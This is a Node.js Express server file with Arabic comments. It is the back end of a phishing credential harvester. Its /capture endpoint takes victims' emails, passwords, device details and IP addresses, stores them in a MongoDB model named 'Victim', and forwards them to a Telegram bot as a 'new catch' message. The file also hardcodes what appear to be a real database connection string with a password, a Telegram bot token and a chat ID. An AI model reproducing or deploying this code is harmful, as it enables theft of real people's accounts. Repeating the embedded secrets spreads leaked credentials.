const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();

// إعدادات الوسيط (Middleware)
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// بياناتك الخاصة - تم دمجها مباشرة
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

// الاتصال بقاعدة البيانات
mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to MongoDB Successfully"))
    .catch(e => console.log("❌ DB Error:", e.message));

// تعريف نموذج الضحية (Schema)
const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, 
    password: String, 
    device: String, 
    ip: String,
    timestamp: { type: Date, default: Date.now }
}));

// تقديم الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات وإرسالها
app.post('/capture', async (req, res) => {
    const data = req.body;
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // تنسيق الرسالة لتصلك بشكل احترافي على تليجرام
    const msg = `
🚀 **صيد جديد - عبد السلام**
━━━━━━━━━━━━━━
📧 **الحساب:** \`${data.email}\`
🔑 **الكلمة:** \`${data.password}\`
🌐 **الآي بي:** \`${visitorIp}\`
📱 **الجهاز:** ${data.device}
⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━
    `;

    try {
        // إرسال البيانات إلى بوت التليجرام الخاص بك
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        console.log("✅ Data sent to Telegram Bot");

        // حفظ نسخة في MongoDB للرجوع إليها لاحقاً
        const entry = new Victim({
            email: data.email,
            password: data.password,
            device: data.device,
            ip: visitorIp
        });
        await entry.save();
        console.log("✅ Data saved to Database");

    } catch (e) { 
        console.log("❌ Error processing data:", e.message); 
    }

    res.status(200).send("OK");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Server is active on port ${PORT}`));
